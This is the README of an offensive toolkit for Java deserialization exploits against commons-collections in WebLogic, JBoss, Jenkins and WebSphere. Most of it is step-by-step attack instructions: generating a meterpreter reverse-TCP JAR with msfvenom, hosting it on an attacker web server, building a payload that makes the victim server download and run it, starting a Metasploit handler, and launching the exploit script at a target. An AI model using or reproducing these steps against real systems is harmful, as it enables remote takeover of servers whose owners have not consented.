Java Untrusted Deserialization Exploits Tools
===

## Originally from github.com/getcode2git/exserial
---

Not much change in code here as it works a charm. However original github is all in Chinese, so for anyone fluent - please visit the original creator :)
Weblogic Versions: 10.3.6, 12.1.2, 12.1.3, 12.2.1
As for the others its probably easily discoverable - just anything running the older versions of commons-collections...

Structure
---

    .
    |____README.md
    |____exserial.jar     CommonsCollections <= 3.2.1 Exploit Gadget
    |____scripts
    | |____jboss.py       JBoss JMXInvokerServlet
    | |____jenkin.py      Jenkins CLI
    | |____weblogic.py    WebLogic
    | |____websphere.py   WebSphere

---

`exserial.jar` Deserialisation Payload Generator：`CommandExec` && `ClassInject`

    $ java -jar exserial.jar
    Java Deserialise Exploit Gadget With (commons-collections <= 3.2.1)
    Usage: java -jar exserial.jar [module type]
        Available module types:
            CommandExec
            ClassInject

### 1. CommandExec

Ability to call command execution：

    $ java -jar exserial.jar CommandExec
    Java Deserialise Exploit Gadget With (commons-collections <= 3.2.1)
    Usage: java -jar exserial.jar CommandExec [platform] [command to execute]
        Available platform types:
            Win
            Linux
            OSX
            

### 2. ClassInject

The `main` method used to cause the target server to dynamically load our specified JAR package and execute the specified class name.

For all you lovely testers `msfvenom` as part of the metasploit package with the `java/meterpreter/reverse_tcp` JAR payload：

    $ msfvenom --payload="java/meterpreter/reverse_tcp" LHOST=192.168.130.1 LPORT=4444 -t jar > java_meterpreter_reverse_tcp.jar
    
Inject `java_meterpreter_reverse_tcp.jar` into our main class within `exserial.jar` with metasploit.Payload：

    $ java -jar exserial.jar ClassInject "http://myserver.com/java_meterpreter_reverse_tcp.jar" "metasploit.Payload" > demo3.ser

### 3. Useage

Set that **MSF handler** running ->
` use exploit/multi/handler `

` set PAYLOAD java/meterpreter/reverse_tcp `

` set LHOST x.x.x.x `

` set LPORT 1234 `

` exploit -j `

Create a malicious **Java Meterpreter** ->
`msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f jar > my_reverse_meterpreter.jar`

Host that bad boy on your **webserver**, make sure that the victim will be able to access this ->
` mv ./my_reverse_meterpreter.jar /var/www/html/`

` service apache2 start` <- Or whatever HTTP Server you prefer :)

Generate your malicious **servlet** ->
` java -jar exserial.jar ClassInject "http://yourwebserver:port/my_reverse_meterpreter.jar" "metasploit.Payload" > exploit.ser`

Fire away and **pray for shells** ->
` python scripts/weblogic.py http://somepoorsod 7001 exploit.ser`

